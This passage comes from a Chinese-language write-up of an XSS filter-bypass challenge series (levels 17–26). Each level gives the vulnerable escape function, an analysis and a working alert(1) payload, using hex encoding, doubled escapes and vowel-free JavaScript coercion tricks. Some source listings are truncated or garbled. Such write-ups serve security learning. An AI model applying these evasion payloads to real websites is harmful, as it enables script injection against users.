### 17.3 Payload
    '+new Function `a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`+'
## 18\. No
### 18.1 源码
    function escape(s) {
        s = s.replace(/[()` 参考链接  
>  
### 18.3 Payload
    ";onerror=eval;throw'=alert\x281\x29'//
## 19\. K'Z'K 1
### 19.1 源码
    // submitted by Stephen Leppik
    function escape(s) {
        // remove vowels in honor of K'Z'K the Destroyer
        s = s.replace(/[aeiouy]/gi, '');
        return '';
    }
### 19.2 分析
正则过滤了`aeiouy`这些字符。可以借助匿名函数和编码来绕过。  
首先构造匿名函数
    []["pop"]["constructor"]('alert(1)')()
将其中的被过滤的字符进行16进制编码。
    a ==> \x61
    e ==> \x65
    i ==> \x69
    o ==> \x6f
    u ==> \x75
    y ==> \x79
此时Payload为
    []["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()
再将前后的语句闭合即可。
    ");[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()//
### 19.3 Payload
    ");[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()//
## 20\. K'Z'K 2
### 20.1 源码
    // submitted by Stephen Leppik
    function escape(s) {
        // remove vowels and escape sequences in honor of K'Z'K 
        // y is only sometimes a vowel, so it's only removed as a literal
        s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
        // remove certain characters that can be used to get vowels
        s = s.replace(/[{}!=<>]/g, '');
        return '';
    }
### 20.2 分析
正则看起来很复杂，不过是将编码的字符串替换为空了，双写一下就能绕过。
### 20.3 Payload
    ");[]["p\\x6fx6fp"]["c\\x6fx6fnstr\\x75x75ct\\x6fx6fr"]('\\x61x61l\\x65x65rt(1)')()//
## 21\. K'Z'K 3
### 21.1 源码
    // submitted by Stephen Leppik
    function escape(s) {
        // remove vowels in honor of K'Z'K the Destroyer
        s = s.replace(/[aeiouy]/gi, '');
        // remove certain characters that can be used to get vowels
        s = s.replace(/[{}!=<>\\]/g, '');
        return '';
    }
### 21.2 分析
比第一题多了一个过滤，不仅过滤了`aeiouy`，还过滤了`{`、`}`、`!`、`=`、``、`\`。这下不能用编码来绕过了。  
类似于第15题。
    []["map"]["constructor"]('alert(1)')()
在Payload中，不符合条件的字符`aeou`。借助js的一些特性可以获取到。
    [][[]]+[] === "undefined"
    ([][[]]+[])[0] === "u"
    ([][[]]+[])[3] === "e"
    1+[][0]+[] === "NaN"
    (1+[][0]+[])[1] === "a"
    []["m"+(1+[][0]+[])[1]+"p"]+[] === "function map() { [native code] }"
    ([]["m"+(1+[][0]+[])[1]+"p"]+[])[26] === "o"
这样所有的字符就都获取到了，修改一下`Payload`
    []["m"+(1+[][0]+[])[1]+"p"]["c"+([]["m"+(1+[][0]+[])[1]+"p"]+[])[26]+"nstr"+([][[]]+[])[0]+"ct"+([]["m"+(1+[][0]+[])[1]+"p"]+[])[26]+"r"]((1+[][0]+[])[1]+"l"+([][[]]+[])[3]+"rt(1)")()
再闭合一下就OK了
### 21.3 Payload
    ");[]["m"+(1+[][0]+[])[1]+"p"]["c"+([]["m"+(1+[][0]+[])[1]+"p"]+[])[26]+"nstr"+([][[]]+[])[0]+"ct"+([]["m"+(1+[][0]+[])[1]+"p"]+[])[26]+"r"]((1+[][0]+[])[1]+"l"+([][[]]+[])[3]+"rt(1)")()//
## 22\. Fruit
### 22.1 源码
    // CVE-2016-4618
    function escape(s) {
        var div = document.implementation.createHTMLDocument().createElement('div');
        div.innerHTML = s;
        function f(n) {
            if ('SCRIPT' === n.tagName) n.parentNode.removeChild(n);
            for (var i = 0; i 
## 23\. Fruit 2
### 23.1 源码
    // CVE-2016-7650
    function escape(s) {
        var div = document.implementation.createHTMLDocument().createElement('div');
        div.innerHTML = s;
        function f(n) {
            if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
            for (var i = 0; i 
## 24\. Capitals
### 24.1 源码
    // submitted by msamuel
    function escape(s) {
        var capitals = {
            "CA": {
                "AB": "Edmonton",
                "BC": "Victoria",
                "MB": "Winnipeg",
                // etc.
            },
            "US": {
                // Alabama changed its state capital.
                "AL": ((year) = >year ' + capitalOf(inputs[0], inputs[1], inputs[2]) + '';
    }
### 24.2 分析
代码的逻辑很简单，我们要想执行`alert(1)`，需要满足`if (typeof capital === 'function')`，而`var
capital = capitals[country][stateOrProvinceName];`，这里想到了我们前面做题用到的匿名函数。
然后我们再用``闭合`b`标签，添加``标签来执行`alert(1)`。
### 24.3 Payload
    CA#constructor#
## 25\. Entities
### 25.1 源码
    // submitted by securityMB
    function escape(s) {
        function htmlentities(s) {
            return s.replace(/[&<>"']/g, c = >` & #$ {
                c.charCodeAt(0)
            };`)
        }
        s = htmlentities(s);
        return` `;
    }
### 25.2 分析
代码对`&`、``、`"`、`'`进行了转义，后面返回值部分存在两个拼接点。借助转义符`\`和注释符来进行绕过，拼接代码执行。
### 25.3 Payload
    ];alert(1)//\
## 26\. %level%
### 26.1 源码
    // submitted anonymously
    function escape(s) {
        const userInput = JSON.stringify(s).replace(/[]/g, '%gt');
        const userTemplate = '';
        return userTemplate.replace(/%userData%/, userInput);
    }
### 26.2 分析
代码对输入的字符串使用`JSON.stringify`进行了处理，然后对``进行了编码。  
在`replace`中，`userInput`是可控的，在这里用到了关于`String​.prototype​.replace()`的一个小`trick`。
>  CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace>
我们可以通过`$'`来引入匹配的子串右边的内容``来闭合开头的``，然后使用`$\`来引入匹配的子串左边的内容`let
some =`，这样就没有双引号来干扰了，直接使用调用`alert(1)`，然后注释掉后面的代码即可。
### 26.3 Payload
    $'$`alert(1)//
## 参考链接
  1. 
  2. 
  3. 